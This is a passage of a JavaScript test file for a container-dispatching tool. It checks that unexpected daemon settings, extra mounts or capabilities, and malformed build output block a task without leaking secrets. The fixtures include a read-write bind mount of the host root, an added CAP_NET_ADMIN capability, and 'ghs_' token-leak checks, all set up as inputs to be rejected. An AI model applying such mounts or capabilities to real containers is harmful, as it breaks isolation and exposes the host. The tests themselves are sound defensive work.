  [{ SecurityOptions: [...VM_OPTIONS, 'name=userns'] }, /none missing, 1 other entry \(not quoted\)/],
  [{ SecurityOptions: [...VM_OPTIONS, 'name=rootless'] }, /none missing, 0 other entries \(not quoted\), one twice/],
  [{ SecurityOptions: null }, /reports no list of security options/],
  [{ DefaultRuntime: 'runsc' }, /default runtime is not runc \(what it reports is not quoted\)/],
  [{ DefaultRuntime: SECRET() }, /default runtime is not runc/],
];

test('#0-284 AC3, review round 1 of factory#22 (decision 1): a daemon whose security options or default runtime are '
  + 'not the VM\'s refuses the run before its first container, the sweep\'s helper included, and no sweep follows',
async () => {
  for (const [info, pattern] of OFF_THE_VM) {
    const { fake } = await setUp({ initial: { containers: [plantedContainer({ name: 'leftover' })] } });
    fake.update((s) => { s.scenario.info = info; });
    let inside = false;
    await assert.rejects(inTaskEnvironment({ runId: RUN_ID, helperImage: HELPER_IMAGE, ...fake.runner },
      async () => { inside = true; }), (error) => {
      assert.ok(error instanceof DaemonOptionsError, error.message);
      assert.match(error.message, new RegExp(`^factory's daemon(?:'s)? .*${pattern.source}.*: no container is made on it$`));
      assert.ok(!error.message.includes('ghs_') && !error.message.includes('runsc') && !error.message.includes('userns'),
        error.message);
      return true;
    });
    assert.equal(inside, false, 'no task');
    assert.deepEqual(steps(fake), ['info'], 'nothing but docker info: no helper, no container, no sweep');
    assert.deepEqual(fake.read().containers.map((c) => c.name), ['leftover'], 'nothing removed');
  }
});

test('#0-284 AC8: a task container rootless Docker starts with OomScoreAdj 200, its daemon\'s, is the dispatcher\'s: '
  + 'the task runs', async () => {
  const { stateDir, fake, options } = await setUp();
  fake.update((s) => { s.scenario.hostConfig = { OomScoreAdj: 200 }; });
  const { result } = await inTaskEnvironment({ runId: RUN_ID, helperImage: HELPER_IMAGE, ...fake.runner },
    async () => (await setUpTaskContainer({ ...options, task: await createTask(stateDir, { runId: RUN_ID }) })).task);
  assert.equal(result.status, 'running', result.reason);
  assert.ok(result.imageId, 'its image is recorded');
});

test('#0-284 AC4: a value the daemon returned reaches no refusal and no task.json: a label\'s key, a mount\'s target, '
  + 'a capability\'s name', async () => {
  const secret = SECRET();
  const feature = { id: FEATURE_REF, ...TASK_CONFIG_LIST.features[FEATURE].digests[FEATURE_DIGEST].metadata };
  for (const [change, pattern] of [
    [(s) => { s.scenario.imageLabels = { 'devcontainer.metadata': JSON.stringify([feature, { [secret]: 'x' }]) }; },
      /devcontainer\.metadata\[1\] holds a key off the list, its key 0 \(not named\)$/],
    [(s) => { s.scenario.imageLabels = { 'devcontainer.metadata': JSON.stringify([feature,
      { containerEnv: { [secret]: 'x' } }]) }; }, /devcontainer\.metadata\[1\]\.containerEnv\.<key 0> is not a key/],
    [(s) => { s.scenario.imageLabels = { 'devcontainer.metadata': JSON.stringify([{ ...feature, [secret]: 1 }]) }; },
      /no key of the list's differs; 1 key off the list \(not named\)$/],
    [(s) => { s.scenario.extraMounts = [{ Type: 'bind', Source: '/', Destination: `/${secret}`, RW: true }]; },
      /the task container's mounts are not the dispatcher's: 1 unexpected, at Mounts\[6\] \(not named\)$/],
    [(s) => { s.scenario.hostConfig = { CapAdd: ['CAP_NET_ADMIN', `CAP_${secret}`] }; },
      /HostConfig\.CapAdd adds 1 capability off the configuration's and its features', at CapAdd\[1\] \(not named\)$/],
    [(s) => { s.scenario.hostConfig = { [`X${secret}`]: secret }; },
      /HostConfig holds 1 field off the dispatcher's table with a value other than its zero, at position \d+ of its keys \(not named\)/],
  ]) {
    const setup = await setUp();
    await blocked(setup, pattern, (f) => f.update(change));
    const text = await readFile(join(setup.stateDir, 'tasks', RUN_ID, 'task.json'), 'utf8');
    assert.ok(!text.includes('ghs_'), text);
  }
});

test('#0-284 AC6: a failed call\'s stderr, the agent\'s side\'s, is in a file 600 of the state, which the task\'s reason '
  + 'names, and not in the reason', async () => {
  const secret = SECRET();
  const setup = await setUp();
  await blocked(setup, /devcontainer build failed \(exit 1\); its stderr, the agent's side's, is not quoted: it is kept in /,
    (f) => { f.update((s) => { s.scenario.buildFails = `error: ${secret}`; }); });
  const { reason } = await loadTask(setup.stateDir, RUN_ID);
  const file = /kept in (\S+)$/.exec(reason)[1];
  assert.ok(file.startsWith(`${join(setup.stateDir, 'stderr')}/`), file);
  assert.equal((await stat(file)).mode & 0o777, 0o600);
  assert.equal(await readFile(file, 'utf8'), `error: ${secret}\n`, 'kept for the owner, whole');
  assert.ok(!reason.includes('ghs_'));
});

test('review round 1 of factory#22, GEN-02: what docker and devcontainer print off its form ends the task BLOCKED, or '
  + 'refuses the run for docker info, and quotes none of it', async () => {
  const secret = SECRET();
  for (const [change, pattern] of [
    [(s) => { s.scenario.buildStdout = `{"outcome":"error","message":"${secret}"}\n`; },
      /^the task container: devcontainer build did not report an image built$/],
    [(s) => { s.scenario.buildStdout = `building ${secret}\n`; },
      /^the task container: devcontainer build did not end with its JSON outcome$/],
    [(s) => { s.scenario.upStdout = `started ${secret}\n`; },
      /^the task container: devcontainer up did not end with its JSON outcome$/],
    [(s) => { s.scenario.upStdout = `{"outcome":"success","containerId":"${secret}"}\n`; },
      /^the task container: devcontainer up did not report a container made$/],
    [(s) => { s.scenario.imageIdRaw = `sha256:${secret}\n`; },
      /^the task container: docker image inspect did not give the built image's ID, sha256:<64 hex>$/],
  ]) {
    const setup = await setUp();
    await blocked(setup, pattern, (f) => f.update(change));
    const text = await readFile(join(setup.stateDir, 'tasks', RUN_ID, 'task.json'), 'utf8');
    assert.ok(!text.includes('ghs_'), text);
  }
  const { fake } = await setUp();
  fake.update((s) => { s.scenario.infoRaw = `not json ${secret}\n`; });
  await assert.rejects(inTaskEnvironment({ runId: RUN_ID, helperImage: HELPER_IMAGE, ...fake.runner }, async () => {}),
    (error) => {
      assert.equal(error.message, 'docker info\'s answer is not JSON');
      return true;
    });
  assert.deepEqual(steps(fake), ['info'], 'no container made, no sweep');
});
